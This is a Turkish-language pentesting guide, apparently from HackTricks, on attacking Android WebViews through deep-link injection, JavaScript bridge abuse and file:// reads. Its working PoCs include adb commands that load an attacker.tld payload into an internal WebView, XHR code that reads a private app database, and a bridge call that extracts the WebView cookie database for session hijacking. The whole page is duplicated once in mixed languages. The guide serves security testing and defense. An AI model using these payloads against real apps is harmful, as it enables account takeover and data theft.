# WebView Saldırıları

{{#include ../../banners/hacktricks-training.md}}

## WebView Yapılandırmaları ve Güvenlik Kılavuzu

### WebView Güvenlik Açıklarına Genel Bakış

Android geliştirmesinin kritik bir yönü WebView'ların doğru şekilde ele alınmasıdır. Bu kılavuz, WebView kullanımıyla ilişkili riskleri azaltmak için önemli yapılandırmalar ve güvenlik uygulamalarını vurgular.

![WebView Example](<../../images/image (1190).png>)

### **File Access in WebViews**

Varsayılan olarak, WebView'lar dosya erişimine izin verir. Bu işlevsellik, Android API level 3 (Cupcake 1.5) sürümünden beri bulunan `setAllowFileAccess()` yöntemiyle kontrol edilir. **android.permission.READ_EXTERNAL_STORAGE** iznine sahip uygulamalar, file URL şeması (`file://path/to/file`) kullanarak harici depolamadan dosya okuyabilirler.

#### **Deprecated Features: Universal and File Access From URLs**

- **Universal Access From File URLs**: Bu kaldırılmış özellik, file URL'lerinden cross-origin isteklerine izin veriyordu ve potansiyel XSS saldırıları nedeniyle önemli bir güvenlik riski oluşturuyordu. Android Jelly Bean ve üzerini hedefleyen uygulamalar için varsayılan ayar devre dışıdır (`false`).
- Bu ayarı kontrol etmek için `getAllowUniversalAccessFromFileURLs()` kullanın.
- Bu ayarı değiştirmek için `setAllowUniversalAccessFromFileURLs(boolean)` kullanın.
- **File Access From File URLs**: Bu özellik de kaldırılmış olup, diğer file şema URL'lerinden içerik erişimini kontrol ediyordu. Universal access gibi, daha iyi bir güvenlik için varsayılan olarak devre dışıdır.
- Kontrol için `getAllowFileAccessFromFileURLs()` ve ayarlamak için `setAllowFileAccessFromFileURLs(boolean)` kullanın.

#### **Güvenli Dosya Yükleme**

Dosya sistemi erişimini devre dışı bırakırken yine de assets ve resources öğelerine erişmek için `setAllowFileAccess()` yöntemi kullanılır. Android R ve üzeri için varsayılan ayar `false`'tur.

- Kontrol için `getAllowFileAccess()` kullanın.
- Etkinleştirmek veya devre dışı bırakmak için `setAllowFileAccess(boolean)` kullanın.

#### **WebViewAssetLoader**

**WebViewAssetLoader** sınıfı, yerel dosyaları yüklemek için modern yaklaşımdır. Yerel assets ve resources'a erişmek için http(s) URL'leri kullanır, Same-Origin politikasına uyarak CORS yönetimini kolaylaştırır.

### loadUrl

Bu, rastgele URL'leri bir WebView'da yüklemek için yaygın olarak kullanılan bir fonksiyondur:
```java
webview.loadUrl("<url here>")
```
Elbette, potansiyel bir saldırganın bir uygulamanın yükleyeceği **URL**'yi kontrol edebilmesi asla olmamalı.

### **JavaScript and Intent Scheme İşleme**

- **JavaScript**: WebViews'te varsayılan olarak devre dışıdır, `setJavaScriptEnabled()` ile etkinleştirilebilir. JavaScript'i uygun önlemler olmadan etkinleştirmek güvenlik açıklarına yol açabileceği için dikkatli olun.
- **Intent Scheme**: WebViews `intent` scheme'ini işleyebilir; uygun şekilde yönetilmezse bu, exploit'lere yol açabilir. Bir örnek zafiyette, açıkta bırakılmış bir WebView parametresi "support_url" kullanılarak cross-site scripting (XSS) saldırıları gerçekleştirilebiliyordu.

![Zafiyetli WebView](<../../images/image (1191).png>)

Exploitation örneği (adb kullanılarak):
```bash
adb.exe shell am start -n com.tmh.vulnwebview/.SupportWebView –es support_url "https://example.com/xss.html"
```
### Javascript Köprüsü

Android tarafından sunulan bir özellik, bir WebView içindeki **JavaScript**'in **native Android uygulama fonksiyonlarını** çağırmasına olanak tanır. Bu, JavaScript'i native Android işlevleriyle entegre eden `addJavascriptInterface` yöntemi kullanılarak gerçekleştirilir; buna _WebView JavaScript bridge_ denir. Bu yöntemin WebView içindeki tüm sayfaların kayıtlı JavaScript Interface nesnesine erişmesine izin verdiği için dikkatli olunmalıdır; eğer bu arayüzler üzerinden hassas bilgiler açığa çıkarsa güvenlik riski oluşturur.

- **Aşırı dikkat gereklidir**: reflection'ı kullanan ve kötü amaçlı JavaScript aracılığıyla remote code execution'a izin veren bir zafiyet nedeniyle Android 4.2 altı sürümleri hedefleyen uygulamalar için.

#### JavaScript Köprüsü Oluşturma

- **JavaScript interfaces** native kod ile etkileşime girebilir; örneklerde bir sınıf metodunun JavaScript'e açıldığı gösterilmiştir:
```javascript
@JavascriptInterface
public String getSecret() {
return "SuperSecretPassword";
};
```
- JavaScript Bridge, WebView'e bir interface eklenerek etkinleştirilir:
```javascript
webView.addJavascriptInterface(new JavascriptBridge(), "javascriptBridge")
webView.reload()
```
- JavaScript aracılığıyla, örneğin bir XSS saldırısı ile potansiyel istismar, açığa çıkarılan Java metotlarının çağrılmasını mümkün kılar:
```html
<script>
alert(javascriptBridge.getSecret())
</script>
```
- Riskleri azaltmak için, **JavaScript bridge kullanımını** APK ile gönderilen kodla sınırlayın ve JavaScript'in uzak kaynaklardan yüklenmesini engelleyin. Eski cihazlar için minimum API level'ı 17 olarak ayarlayın.

### Reflection-based Remote Code Execution (RCE)

- Belgelenmiş bir yöntem, belirli bir payload çalıştırılarak reflection yoluyla RCE elde etmeye olanak verir. Ancak, `@JavascriptInterface` annotation'ı yetkisiz metoda erişimi engeller ve saldırı yüzeyini sınırlar.

### Remote Debugging

- **Remote debugging**, **Chrome Developer Tools** ile mümkündür; bu, WebView içeriğiyle etkileşime ve keyfi JavaScript yürütmeye izin verir.

#### Enabling Remote Debugging

- Remote debugging, bir uygulama içindeki tüm WebViews için şu şekilde etkinleştirilebilir:
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
WebView.setWebContentsDebuggingEnabled(true);
}
```
- Uygulamanın debuggable durumuna bağlı olarak debugging'i koşullu olarak etkinleştirmek için:
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
if (0 != (getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE))
{ WebView.setWebContentsDebuggingEnabled(true); }
}
```
## Exfiltrate arbitrary files

- XMLHttpRequest kullanarak arbitrary files'ın exfiltration'ını gösterir:
```javascript
var xhr = new XMLHttpRequest()
xhr.onreadystatechange = function () {
if (xhr.readyState == XMLHttpRequest.DONE) {
alert(xhr.responseText)
}
}
xhr.open(
"GET",
"file:///data/data/com.authenticationfailure.wheresmybrowser/databases/super_secret.db",
true
)
xhr.send(null)
```
# Webview Attacks



## Guide on WebView Configurations and Security

### Overview of WebView Vulnerabilities

Android geliştirmede kritik bir konu, WebView'ların doğru şekilde ele alınmasıdır. Bu rehber, WebView kullanımına bağlı riskleri azaltmak için önemli yapılandırmaları ve güvenlik uygulamalarını vurgular.

![WebView Example](<../../images/image (1190).png>)

### **File Access in WebViews**

Varsayılan olarak, WebView'lar dosya erişimine izin verir. Bu işlevsellik, Android API seviyesi 3 (Cupcake 1.5)'ten beri kullanılabilen `setAllowFileAccess()` yöntemiyle kontrol edilir. **android.permission.READ_EXTERNAL_STORAGE** iznine sahip uygulamalar, `file://path/to/file` dosya URL şeması kullanarak harici depolamadan dosya okuyabilir.

#### **Deprecated Features: Universal and File Access From URLs**

- **Universal Access From File URLs**: Bu kullanımdan kaldırılmış özellik, file URL'lerinden cross-origin isteklerine izin veriyordu ve potansiyel XSS saldırıları nedeniyle önemli bir güvenlik riski oluşturuyordu. Android Jelly Bean ve daha yeni sürümleri hedefleyen uygulamalar için varsayılan ayar devre dışı (`false`)dır.
- Bu ayarı kontrol etmek için `getAllowUniversalAccessFromFileURLs()` kullanın.
- Bu ayarı değiştirmek için `setAllowUniversalAccessFromFileURLs(boolean)` kullanın.
- **File Access From File URLs**: Bu özellik de kullanımdan kaldırılmış olup, diğer file scheme URL'lerinden gelen içeriğe erişimi kontrol ediyordu. Universal access gibi, daha iyi güvenlik için varsayılanı devre dışıdır.
- Kontrol etmek için `getAllowFileAccessFromFileURLs()` ve ayarlamak için `setAllowFileAccessFromFileURLs(boolean)` kullanın.

#### **Secure File Loading**

Dosya sistemi erişimini devre dışı bırakırken asset'lere ve resource'lara erişmeye devam etmek için `setAllowFileAccess()` yöntemi kullanılır. Android R ve üstünde varsayılan ayar `false`'dur.

- Kontrol etmek için `getAllowFileAccess()`.
- Etkinleştirmek veya devre dışı bırakmak için `setAllowFileAccess(boolean)`.

#### **WebViewAssetLoader**

**WebViewAssetLoader** sınıfı, yerel dosyaları yüklemek için modern yaklaşımdır. Yerel assets ve resources'a erişmek için http(s) URL'lerini kullanır, Same-Origin politikasına uyarak CORS yönetimini kolaylaştırır.

### loadUrl

Bu, bir WebView'da rastgele URL'leri yüklemek için kullanılan yaygın bir fonksiyondur:
```java
webview.loadUrl("<url here>")
```
Elbette, potansiyel bir saldırgan bir uygulamanın yükleyeceği **URL'yi kontrol etme** yeteneğine asla sahip olmamalıdır.

### Deep-linking into internal WebView (custom scheme → WebView sink)

Birçok uygulama, user-supplied URL'yi uygulama içi bir WebView'e yönlendiren custom schemes/paths kaydeder. Eğer deep link exported (VIEW + BROWSABLE) ise, bir saldırgan uygulamayı WebView context içinde keyfi uzak içeriği render etmeye zorlayabilir.

Tipik manifest pattern (simplified):
```xml
<activity android:name=".MainActivity" android:exported="true">
<intent-filter>
<action android:name="android.intent.action.VIEW" />
<category android:name="android.intent.category.DEFAULT" />
<category android:name="android.intent.category.BROWSABLE" />
<data android:scheme="myscheme" android:host="com.example.app" />
</intent-filter>
</activity>
```
Yaygın kod akışı (basitleştirilmiş):
```java
// Entry activity
@Override
protected void onNewIntent(Intent intent) {
Uri deeplink = intent.getData();
String url = deeplink.getQueryParameter("url"); // attacker-controlled
if (deeplink.getPathSegments().get(0).equals("web")) {
Intent i = new Intent(this, WebActivity.class);
i.putExtra("url", url);
startActivity(i);
}
}

// WebActivity sink
webView.loadUrl(getIntent().getStringExtra("url"));
```
Saldırı deseni ve PoC (adb üzerinden):
```bash
# Template – force load in internal WebView
adb shell am start -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"

# If a specific Activity must be targeted
adb shell am start -n com.example/.MainActivity -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"
```
Impact: uzak sayfa uygulamanın WebView bağlamında çalışır (uygulama WebView profiline ait cookies/session, açığa çıkmış herhangi bir @JavascriptInterface'e erişim, ayarlara bağlı olarak content:// ve file:// erişimi potansiyeli).

Hunting tips:
- Decompile edilmiş kaynaklarda `getQueryParameter("url")`, `loadUrl(`, `WebView` sinks ve deep-link handler'ları (`onCreate/onNewIntent`) için grep yapın.
- Manifest'i, daha sonra bir WebView başlatan aktivitelere eşlenen VIEW+BROWSABLE filtreleri ve custom schemes/hosts için inceleyin.
- Birden fazla deep-link yolu (ör. “external browser” yolu vs. “internal webview” yolu) olup olmadığını kontrol edin ve uygulama içinde render olanı tercih edin.

### Doğrulamadan önce JavaScript'i etkinleştirme (kontrol sırası hatası)

Sık yapılan bir sertleştirme hatası, hedef URL'nin nihai allowlist/verification tamamlanmadan önce JavaScript'i etkinleştirmek veya gevşek WebView ayarları yapılandırmaktır. Doğrulama yardımcılar arasında tutarsızsa veya çok geç gerçekleşirse, bir saldırganın deep link'i şu duruma ulaşabilir:

1) WebView ayarları uygulanır (ör. `setJavaScriptEnabled(true)`), ve
2) Güvenilmeyen URL JavaScript etkin olarak yüklenir.

Bug pattern (pseudocode):
```java
// 1) Parse/early checks
Uri u = parse(intent);
if (!looksValid(u)) return;

// 2) Configure WebView BEFORE final checks
webView.getSettings().setJavaScriptEnabled(true); // BAD: too early
configureMixedContent();

// 3) Do final verification (late)
if (!finalAllowlist(u)) return; // too late – JS already enabled

// 4) Load
webView.loadUrl(u.toString());
```
Neden sömürülebilir
- Tutarsız normalizasyon: yardımcılar URL'i son kontrolden farklı şekilde bölüp yeniden oluşturur, bu da kötü niyetli bir URL'in istismar edebileceği uyumsuzluklar yaratır.
- Sırası bozulmuş işlem hattı: adım 2'de JS'i etkinleştirmek, WebView örneğine global olarak uygulanır; doğrulama daha sonra başarısız olsa bile son yüklemeyi etkiler.

Nasıl test edilir
- Erken kontrolleri geçip WebView yapılandırma sayfasına ulaşan deep-link payloads oluşturun.
- adb kullanarak implicit VIEW intents tetikleyin; bunlar sizin kontrolünüzdeki `url=` parametresini gönderir:
```bash
adb shell am start -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"
```
Eğer exploitation başarılı olursa, payload'unuz uygulamanın WebView'ında JavaScript çalıştırır. Oradan, exposed bridges için araştırma yapın:
```html
<script>
for (let k in window) {
try { if (typeof window[k] === 'object' || typeof window[k] === 'function') console.log('[JSI]', k); } catch(e){}
}
</script>
```
Savunma yönergeleri
- Bir kez canonicalize edin; doğrulamayı tek bir güvenilir kaynağa karşı sıkı şekilde yapın (scheme/host/path/query).
- Tüm allowlist kontrolleri geçtikten ve güvenilir içeriği yüklemeden hemen önce `setJavaScriptEnabled(true)` çağırın.
- `@JavascriptInterface`'i güvensiz origin'lere ifşa etmekten kaçının; per-origin gating tercih edin.
- Güvenilir ve güvensiz içerik için per-WebView örnekleri kullanmayı düşünün; varsayılan olarak JS devre dışı olsun.

### **JavaScript ve Intent Scheme İşleme**

- **JavaScript**: WebView'larda varsayılan olarak devre dışıdır, `setJavaScriptEnabled()` ile etkinleştirilebilir. Uygun önlemler alınmadan JavaScript'i etkinleştirmek güvenlik açıklarına yol açabilir; dikkatli olun.
- **Intent Scheme**: WebView'lar `intent` şemasını işleyebilir; dikkatli yönetilmezse sömürüye yol açabilir. Bir örnek zafiyette, ifşa edilmiş bir WebView parametresi "support_url" kullanılarak cross-site scripting (XSS) saldırıları gerçekleştirilebiliyordu.

![Zafiyetli WebView](<../../images/image (1191).png>)

adb kullanılarak sömürü örneği:
```bash
adb.exe shell am start -n com.tmh.vulnwebview/.SupportWebView –es support_url "https://example.com/xss.html"
```
### Javascript Köprüsü

Android, bir WebView içindeki **JavaScript**'in **yerel Android uygulama işlevlerini** çağırmasını sağlayan bir özellik sunar. Bu, JavaScript'i yerel Android işlevleriyle entegre eden `addJavascriptInterface` yöntemi kullanılarak gerçekleştirilir; bu yapıya _WebView JavaScript bridge_ denir. Bu yöntemin, WebView içindeki tüm sayfaların kayıtlı JavaScript Interface nesnesine erişmesine izin verdiği için dikkatli olunmalıdır; bu arayüzler aracılığıyla hassas bilgiler açığa çıkarsa güvenlik riski oluşturur.

- Android 4.2'nin altındaki sürümlere yönelik uygulamalar için, reflection'ı suistimal eden kötü amaçlı JavaScript aracılığıyla remote code execution'a izin veren bir zafiyet nedeniyle **aşırı dikkat gereklidir**.

#### Bir JavaScript Köprüsünü Uygulama

- **JavaScript arayüzleri** native kod ile etkileşime girebilir; bir sınıf metodunun JavaScript'e açıldığı örneklerde gösterildiği gibi:
```javascript
@JavascriptInterface
public String getSecret() {
return "SuperSecretPassword";
};
```
- JavaScript Bridge, WebView'e bir interface ekleyerek etkinleştirilir:
```javascript
webView.addJavascriptInterface(new JavascriptBridge(), "javascriptBridge")
webView.reload()
```
- JavaScript aracılığıyla, örneğin bir XSS attack yoluyla, açığa çıkmış Java methods'ları çağırmaya izin verebilecek potansiyel bir istismar:
```html
<script>
alert(javascriptBridge.getSecret())
</script>
```
- Riskleri azaltmak için, **JavaScript bridge kullanımını** APK ile dağıtılan kodla sınırlayın ve JavaScript'in uzaktan kaynaklardan yüklenmesini engelleyin. Eski cihazlar için minimum API level'ı 17 olarak ayarlayın.

#### Abusing dispatcher-style JS bridges (invokeMethod/handlerName)

Yaygın bir desen, tek bir dışa aktarılmış metod (ör. `@JavascriptInterface void invokeMethod(String json)`) olup, saldırgan kontrollü JSON'u genel bir nesneye dönüştürür ve sağlanan handler name'e göre yönlendirir. Tipik JSON yapısı:
```json
{
"handlerName": "toBase64",
"callbackId": "cb_12345",
"asyncExecute": "true",
"data": { /* handler-specific fields */ }
}
```
Risk: eğer kayıtlı herhangi bir `handler` saldırgan verisi üzerinde ayrıcalıklı işlemler gerçekleştiriyorsa (ör. doğrudan dosya okuma), `handlerName`'i uygun şekilde ayarlayarak onu çağırabilirsiniz. Sonuçlar genellikle `evaluateJavascript` aracılığıyla ve `callbackId` ile anahtarlanan bir callback/promise mekanizmasıyla sayfa bağlamına gönderilir.

Key hunting steps
- `addJavascriptInterface(` için decompile edip grep çekerek bridge nesnesinin adını öğrenin (ör. `xbridge`).
- Chrome DevTools (chrome://inspect) içinde, bridge nesnesinin adını Console'a yazın (ör. `xbridge`) ve açığa çıkan alanlar/metodları listeleyin; `invokeMethod` gibi genel bir dispatcher arayın.
- `getModuleName()`'ı uygulayan sınıfları veya registration map'lerini arayarak handler'ları listeleyin.

#### Arbitrary file read via URI → File sinks (Base64 exfiltration)

If a handler takes a URI, calls `Uri.parse(req.getUri()).getPath()`, builds `new File(...)` and reads it without allowlists or sandbox checks, you get an arbitrary file read in the app sandbox that bypasses WebView settings like `setAllowFileAccess(false)` (the read happens in native code, not via the WebView network stack).

PoC to exfiltrate the Chromium WebView cookie DB (session hijack):
```javascript
// Minimal callback sink so native can deliver the response
window.WebViewJavascriptBridge = {
_handleMessageFromObjC: function (data) { console.log(data) }
};

const payload = JSON.stringify({
handlerName: 'toBase64',
callbackId: 'cb_' + Date.now(),
data: { uri: 'file:///data/data/<pkg>/app_webview/Default/Cookies' }
});

xbridge.invokeMethod(payload);
```
Notlar
- Çerez DB yolları cihazlar/sağlayıcılar arasında değişir. Yaygın olanlar:
- `file:///data/data/<pkg>/app_webview/Default/Cookies`
- `file:///data/data/<pkg>/app_webview_<pkg>/Default/Cookies`
- İşleyici Base64 döndürür; çerezleri kurtarmak ve uygulamanın WebView profilinde kullanıcıyı taklit etmek için decode edin.

Tespit ipuçları
- Uygulamayı kullanırken `evaluateJavascript` aracılığıyla döndürülen büyük Base64 dizelerine dikkat edin.
- `uri`/`path` kabul eden ve bunları `new File(...)`'a dönüştüren handler'lar için decompiled kaynaklarda grep yapın.

#### WebView ayrıcalık kapılarını atlatma – endsWith() host kontrolleri

Ayrıcalık kararları (JSB-enabled Activity seçimi) genellikle host allowlist'lerine dayanır. Hatalı bir desen şudur:
```java
String host = Uri.parse(url).getHost();
boolean z = true;
if (!host.endsWith(".trusted.com")) {
if (!".trusted.com".endsWith(host)) {
z = false;
}
}
// z==true → open privileged WebView
```
Eşdeğer mantık (De Morgan'ın kuralları):
```java
boolean z = host.endsWith(".trusted.com") ||
".trusted.com".endsWith(host);
```
Bu bir origin check değildir. Birçok istenmeyen host ikinci hükmü karşılayarak güvensiz domainlerin ayrıcalıklı Activity'ye girmesine izin verir. Her zaman scheme ve host'u katı bir allowlist'e (exact match veya dot-boundaries ile doğru bir subdomain kontrolü) karşı doğrulayın, `endsWith` hileleriyle değil.

#### javascript:// execution primitive via loadUrl

Privileged WebView içine girdikten sonra, uygulamalar bazen inline JS'i şu yolla çalıştırır:
```java
webView.loadUrl("javascript:" + jsPayload);
```
If an internal flow triggers `loadUrl("javascript:...")` in that context, injected JS executes with bridge access even if the external page wouldn’t normally be allowed. Pentest steps:
- Uygulamada `loadUrl("javascript:` ve `evaluateJavascript(` için grep yapın.
- Yetkili WebView'e zorla yönlendirme yaptıktan sonra (örn., via a permissive deep link chooser) bu kod yollarına ulaşmayı deneyin.
- Primitive'i kullanarak dispatcher'ı (`xbridge.invokeMethod(...)`) çağırın ve hassas handler'lara erişin.

Mitigations (developer checklist)
- Strict origin verification for privileged Activities: şemayı/hostu canonicalize edip açık bir allowlist'e karşı karşılaştırın; `endsWith` tabanlı kontrollerden kaçının. Uygun olduğunda Digital Asset Links'i değerlendirin.
- Bridge'leri yalnızca güvenilen sayfalara sınırlandırın ve her çağrıda güveni yeniden doğrulayın (per-call authorization).
- Dosya sistemi yeteneği olan handler'ları kaldırın veya sıkı koruma altına alın; ham `file://` yolları yerine `content://`'i allowlist'ler/izinlerle tercih edin.
- Yetkili bağlamlarda `loadUrl("javascript:")` kullanmaktan kaçının veya bunu güçlü kontrollerin arkasına alın.
- `setAllowFileAccess(false)`'ın bridge aracılığıyla native dosya okumalarına karşı koruma sağlamadığını unutmayın.

#### JSB enumeration and debugging tips

- Enable WebView remote debugging to use Chrome DevTools Console:
- App-side (debug builds): `WebView.setWebContentsDebuggingEnabled(true)`
- System-side: modules like [LSPosed](https://github.com/LSPosed/LSPosed) or Frida scripts can force-enable debugging even in release builds. Example Frida snippet for Cordova WebViews: [cordova enable webview debugging](http://codeshare.frida.re/@gameFace22/cordova---enable-webview-debugging/)
- In DevTools, type the bridge object name (e.g., `xbridge`) to see exposed members and probe the dispatcher.


### Reflection-based Remote Code Execution (RCE)

- A documented method allows achieving RCE through reflection by executing a specific payload. However, the `@JavascriptInterface` annotation prevents unauthorized method access, limiting the attack surface.

### Remote Debugging

- **Remote debugging** is possible with **Chrome Developer Tools**, enabling interaction and arbitrary JavaScript execution within the WebView content.

#### Enabling Remote Debugging

- Remote debugging can be enabled for all WebViews within an application by:
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
WebView.setWebContentsDebuggingEnabled(true);
}
```
- Uygulamanın debuggable durumuna bağlı olarak debugging'i koşullu olarak etkinleştirmek için:
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
if (0 != (getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE))
{ WebView.setWebContentsDebuggingEnabled(true); }
}
```
## Exfiltrate arbitrary files

- XMLHttpRequest kullanarak arbitrary files exfiltration'ını gösterir:
```javascript
var xhr = new XMLHttpRequest()
xhr.onreadystatechange = function () {
if (xhr.readyState == XMLHttpRequest.DONE) {
alert(xhr.responseText)
}
}
xhr.open(
"GET",
"file:///data/data/com.authenticationfailure.wheresmybrowser/databases/super_secret.db",
true
)
xhr.send(null)
```
## Kaynaklar

- [Review of Android WebViews file access attack vectors](https://labs.integrity.pt/articles/review-android-webviews-fileaccess-attack-vectors/index.html)
- [WheresMyBrowser.Android (demo app)](https://github.com/authenticationfailure/WheresMyBrowser.Android)
- [Android WebView reference](https://developer.android.com/reference/android/webkit/WebView)
- [Deep Links & WebViews Exploitations – Part II](https://medium.com/@justmobilesec/deep-links-webviews-exploitations-part-ii-5c0b118ec6f1)
- [Deep Links & WebViews Exploitations – Part I](https://www.justmobilesec.com/en/blog/deep-links-webviews-exploitations-part-I)
- [Samsung S24 Exploit Chain Pwn2Own 2024 Walkthrough](https://medium.com/@happyjester80/samsung-s24-exploit-chain-pwn2own-2024-walkthrough-c7a3da9a7a26)
- [Pwn2Own Ireland 2024 – Samsung S24 attack chain (whitepaper)](https://maliciouserection.com/2025/05/13/pwn2own-ireland-2024-samsung-s24-attack-chain-whitepaper.html)
- [Demonstration video](https://www.youtube.com/watch?v=LAIr2laU-So)
- [Account takeover in Android app via JSB – tuxplorer.com](https://tuxplorer.com/posts/account-takeover-via-jsb/)
- [LSPosed – systemless Xposed framework](https://github.com/LSPosed/LSPosed)
- [Frida codeshare: Cordova – enable WebView debugging](http://codeshare.frida.re/@gameFace22/cordova---enable-webview-debugging/)

{{#include ../../banners/hacktricks-training.md}}
